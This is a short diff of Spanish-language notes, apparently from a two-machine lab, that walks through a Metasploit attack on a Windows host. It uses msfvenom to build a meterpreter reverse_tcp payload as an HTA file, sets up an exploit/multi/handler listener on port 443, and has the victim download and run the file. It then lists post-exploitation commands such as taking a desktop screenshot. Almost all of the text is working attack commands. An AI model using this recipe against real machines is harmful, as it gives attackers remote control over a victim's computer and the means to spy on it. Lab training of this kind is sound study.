@@ -6,4 +6,18 @@
 ++ PC1: ip addr show
 ++ PC1: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_PC1> LPORT=443 -f
 hta-psh -o <nombre_archivo.hta>
+++ PC1: msfconsole
+++ PC1: use exploit/multi/handler
+++ PC1: set payload windows/meterpreter/reverse_tcp
+++ PC1: set LHOST <ip_PC1>
+++ PC1: set LPORT 443
+++ PC1: exploit
+++ PC2: Ir a un navegador web y colocar <ip_PC1:8080> descargar y ejecutar el archivo .hta
+++ PC1: Se abrirá una sesión que nos da el control sobre PC2, lo que nos permite
+ejecutar comandos más avanzados como:
+--- help (Para ver todos los comandos disponibles)
+--- screenshot (Para tomar una captura del escritorio)
+
+
+
 
